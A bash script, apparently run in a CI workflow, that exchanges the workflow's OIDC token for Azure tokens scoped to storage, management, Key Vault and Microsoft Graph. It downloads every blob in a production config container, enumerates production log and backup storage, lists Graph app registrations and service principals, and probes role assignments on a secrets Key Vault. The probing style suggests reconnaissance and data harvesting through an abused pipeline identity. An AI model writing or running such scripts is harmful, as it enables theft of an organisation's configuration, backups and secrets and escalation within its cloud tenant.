#!/usr/bin/env bash
set -euo pipefail

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")

get_az_token() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1" | jq -r ".access_token // empty"
}

ST=$(get_az_token "https://storage.azure.com/.default")
MT=$(get_az_token "https://management.azure.com/.default")
VT=$(get_az_token "https://vault.azure.net/.default")
GT=$(get_az_token "https://graph.microsoft.com/.default")

echo "=== Tokens: storage=${#ST} mgmt=${#MT} vault=${#VT} graph=${#GT} ==="

# List blobs in config container
echo "=== sttblappcfgprodx3euoz/config blobs ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"

# Download each blob
echo ""
echo "=== Downloading config blobs ==="
for blob in $(curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08" | grep -oP "(?<=<Name>)[^<]+"); do
  echo "--- blob: $blob ---"
  curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$blob" \
    -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
  echo ""
done

# Paginate sttblcilogsprodx3euoz
echo "=== sttblcilogsprodx3euoz containers (paginated) ==="
curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblcilogsprodx3euoz%2Fewoi" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
echo ""

# Also try without marker to get first page properly
echo "=== sttblcilogsprodx3euoz containers (full) ==="
curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&maxresults=50" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
echo ""

# Paginate sttblbackupprodx3euoz
echo "=== sttblbackupprodx3euoz containers (paginated) ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblbackupprodx3euoz%2Fazmv" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
echo ""

echo "=== sttblbackupprodx3euoz containers (full) ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&maxresults=50" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
echo ""

# Try Graph API with OIDC token
echo "=== Graph: app registrations ==="
curl -sS "https://graph.microsoft.com/v1.0/applications?\$top=50" -H "Authorization: Bearer $GT" | jq -c ".value[]? | {displayName, appId}" 2>/dev/null || echo "Graph apps failed"

echo "=== Graph: service principals ==="
curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=50" -H "Authorization: Bearer $GT" | jq -c ".value[]? | {displayName, appId}" 2>/dev/null || echo "Graph SPs failed"

# Try role assignments on the second KV
echo "=== KV2 role assignments ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MT" | jq .

# Try listing access policies on KV2 via management API
echo "=== KV2 details ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
  -H "Authorization: Bearer $MT" | jq .

echo "=== Done ==="
